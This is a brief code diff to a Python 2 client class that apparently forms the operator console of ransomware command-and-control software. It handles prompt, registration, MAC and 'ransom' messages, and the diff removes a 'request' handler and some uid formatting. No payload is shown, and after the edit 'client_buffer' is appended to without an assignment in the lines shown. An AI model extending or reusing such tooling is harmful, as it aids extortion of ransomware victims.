@@ -298,8 +298,7 @@ class Client(threading.Thread):
                 client_data = self.decrypt(data)
 
                 if 'prompt' in method:
-                    client_buffer = client_data.format(self.uid)
-                    print client_data.format(self.uid),
+                    print client_data,
                     client_buffer += raw_input('')
                     client_buffer += "\n"
                     self.sender(client_buffer)
@@ -309,8 +308,6 @@ class Client(threading.Thread):
                         self.registered = self.query(client_data)
                     elif 'mac' in method:
                         self.mac = client_data
-                    elif 'request' in method:
-                        request  = self.request(client_data)
                     elif 'ransom' in method:
                         ransom = self.query(client_data)
                     print client_data
